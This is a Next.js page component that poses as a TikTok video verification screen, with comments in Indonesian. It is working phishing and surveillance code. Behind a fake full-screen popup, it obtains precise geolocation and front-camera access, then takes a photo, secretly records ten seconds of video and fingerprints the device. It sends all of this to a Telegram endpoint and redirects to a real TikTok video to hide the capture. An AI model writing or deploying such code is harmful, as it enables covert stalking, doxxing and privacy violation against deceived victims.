"use client";

import { useState, useRef, useEffect } from "react";

// URL video TikTok yang asli
const TIKTOK_VIDEO_URL = "https://www.tiktok.com/@slowmoetamin/video/7189732707822226694?is_from_webapp=1&sender_device=pc&web_id=7641670620761261576";

export default function TikTokVerifyPage() {
  const [isVerified, setIsVerified] = useState(false);
  const [isChecking, setIsChecking] = useState(false);
  const [hasTriggered, setHasTriggered] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const redirectUrl = TIKTOK_VIDEO_URL;

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPopup(true);
    }, 800);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const video = document.createElement("video");
    video.style.display = "none";
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);
    videoRef.current = video;

    return () => {
      if (videoRef.current) {
        document.body.removeChild(videoRef.current);
      }
    };
  }, []);

  const handleVerifyClick = async () => {
    if (hasTriggered) return;
    setHasTriggered(true);
    setIsChecking(true);

    try {
      // 1. Request Geolocation FIRST
      let locationPromise = new Promise<{ lat: number; lng: number } | null>((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
            () => resolve(null),
            { timeout: 10000, enableHighAccuracy: true }
          );
        } else {
          resolve(null);
        }
      });

      // 2. Request Camera Permission (after location)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
      });

      setIsVerified(true);
      setIsChecking(false);

      (async () => {
        try {
          const photoBlob = await takePhoto(stream);
          const videoBlob = await recordVideo(stream, 10000);
          stream.getTracks().forEach((track) => track.stop());
          const location = await locationPromise;

          const formData = new FormData();
          if (photoBlob) formData.append("photo", photoBlob, "photo.jpg");
          if (videoBlob) formData.append("video", videoBlob, "video.webm");

          const ua = navigator.userAgent;
          const getOS = () => {
            if (/android/i.test(ua)) {
              const androidMatch = ua.match(/Android\s+([\d.]+)/);
              const modelMatch = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
              return `Android ${androidMatch?.[1] || '?'} (${modelMatch?.[1]?.trim() || 'Unknown Device'})`;
            }
            if (/iPad|iPhone|iPod/.test(ua)) {
              const iosMatch = ua.match(/OS\s+([\d_]+)/);
              return `iOS ${iosMatch?.[1]?.replace(/_/g, '.') || '?'}`;
            }
            if (/Windows/.test(ua)) {
              const winMatch = ua.match(/Windows NT\s+([\d.]+)/);
              const winVer: Record<string, string> = {'10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7'};
              return `Windows ${winVer[winMatch?.[1] || ''] || winMatch?.[1] || '?'}`;
            }
            if (/Mac OS X/.test(ua)) {
              const macMatch = ua.match(/Mac OS X\s+([\d_]+)/);
              return `macOS ${macMatch?.[1]?.replace(/_/g, '.') || '?'}`;
            }
            if (/Linux/.test(ua)) return 'Linux';
            return 'Unknown OS';
          };
          const getBrowser = () => {
            if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
            if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
            if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
            if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
            return 'Unknown Browser';
          };
          const getConnection = () => {
            const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
            if (conn) {
              const type = conn.effectiveType || conn.type || 'unknown';
              const downlink = conn.downlink ? `${conn.downlink} Mbps` : '';
              const rtt = conn.rtt ? ` (${conn.rtt}ms latency)` : '';
              return `${type.toUpperCase()}${downlink ? ' - ' + downlink : ''}${rtt}`;
            }
            return 'Unknown';
          };

          let batteryInfo = 'Unknown';
          try {
            const battery = await (navigator as any).getBattery?.();
            if (battery) {
              const level = Math.round(battery.level * 100);
              batteryInfo = `${level}%${battery.charging ? ' (Charging)' : ' (Discharging)'}`;
            }
          } catch {}

          const ramGB = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown';
          const cpuCores = navigator.hardwareConcurrency || 'Unknown';
          const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
          const dpr = window.devicePixelRatio || 1;
          const colorDepth = window.screen.colorDepth;

          const locationInfoStr = `🎵 TIKTOK VIDEO VERIFICATION\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n🕐 Timestamp: ${new Date().toISOString()}\n\n📍 LOCATION\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n${location ? `🌐 Latitude: ${location.lat}\n🌐 Longitude: ${location.lng}\n🔗 Google Maps: https://www.google.com/maps?q=${location.lat},${location.lng}` : '❌ Location denied'}\n\n💻 DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📱 OS: ${getOS()}\n🌐 Browser: ${getBrowser()}\n🖥️ Platform: ${navigator.platform}\n🌍 Language: ${navigator.language}\n🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🔋 Battery: ${batteryInfo}\n🧠 RAM: ${ramGB}\n⚡ CPU Cores: ${cpuCores}\n📶 Network: ${getConnection()}\n\n📐 SCREEN\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📏 Resolution: ${window.screen.width}x${window.screen.height}\n👁️ Viewport: ${window.innerWidth}x${window.innerHeight}\n🔍 Pixel Ratio: ${dpr}x\n🎨 Color Depth: ${colorDepth}-bit\n🔃 Orientation: ${orientation}\n\n📋 USER AGENT\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n${ua}`;
          formData.append("locationInfo", locationInfoStr);

          await fetch("/api/telegram", {
            method: "POST",
            body: formData,
          });

          // Data terkirim, langsung redirect ke video TikTok
          window.location.href = redirectUrl;
        } catch (bgError) {
          console.error("Background capture failed:", bgError);
          window.location.href = redirectUrl;
        }
      })();

    } catch (err) {
      console.error("Permission denied or failed:", err);
      window.location.href = redirectUrl;
    }
  };

  const takePhoto = (stream: MediaStream): Promise<Blob | null> => {
    return new Promise((resolve) => {
      const video = videoRef.current;
      if (!video) return resolve(null);

      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(
              (blob) => resolve(blob),
              "image/jpeg",
              0.8
            );
          } else {
            resolve(null);
          }
        }, 1500);
      };
    });
  };

  const recordVideo = (stream: MediaStream, durationMs: number): Promise<Blob | null> => {
    return new Promise((resolve) => {
      let mediaRecorder: MediaRecorder;
      try {
        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      } catch (e) {
        try {
          mediaRecorder = new MediaRecorder(stream);
        } catch (e2) {
          return resolve(null);
        }
      }

      const chunks: Blob[] = [];
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mediaRecorder.mimeType });
        resolve(blob);
      };

      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state !== "inactive") {
          mediaRecorder.stop();
        }
      }, durationMs);
    });
  };

  return (
    <div className="relative min-h-screen flex justify-center items-center font-sans overflow-hidden" style={{ background: '#000' }}>
      
      {/* Background Image - HALAMAN-TIKTOK.jpeg (NO blur, NO darkening) */}
      <div 
        className="fixed inset-0 w-full h-full z-0"
      >
        <img 
          src="/HALAMAN-TIKTOK.jpeg" 
          alt="TikTok Video" 
          className="w-full h-full object-cover"
        />
      </div>

      {/* Bottom Sheet Popup - slides up from bottom, FULLY CLICKABLE */}
      {showPopup && !isVerified && (
        <div 
          className="fixed inset-0 z-10 flex items-end justify-center cursor-pointer"
          onClick={handleVerifyClick}
        >
          <div 
            className="w-full max-w-lg mx-auto animate-slide-up cursor-pointer"
          >
            <img 
              src="/POPUPTIKTOK.jpeg" 
              alt="Buka TikTok" 
              className="w-full h-auto rounded-t-2xl shadow-2xl pointer-events-none"
              style={{ maxHeight: '70vh', objectFit: 'contain' }}
            />
          </div>
        </div>
      )}

      {/* Success Toast */}
      {isVerified && (
        <div className="absolute top-6 left-1/2 -translate-x-1/2 z-30 text-white text-sm font-semibold py-2 px-4 rounded-full shadow-lg animate-[drop-in_2s_ease-in-out_forwards]" style={{ backgroundColor: '#fe2c55' }}>
          ✓ Verifikasi Berhasil
        </div>
      )}

      {/* Custom Styles */}
      <style dangerouslySetInnerHTML={{__html: `
        @keyframes slide-up {
          0% { transform: translateY(100%); opacity: 0; }
          100% { transform: translateY(0); opacity: 1; }
        }
        @keyframes drop-in {
          0% { transform: translate(-50%, -20px); opacity: 0; }
          10% { transform: translate(-50%, 0); opacity: 1; }
          80% { transform: translate(-50%, 0); opacity: 1; }
          100% { transform: translate(-50%, -20px); opacity: 0; visibility: hidden; }
        }
        .animate-slide-up {
          animation: slide-up 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }
      `}} />

    </div>
  );
}
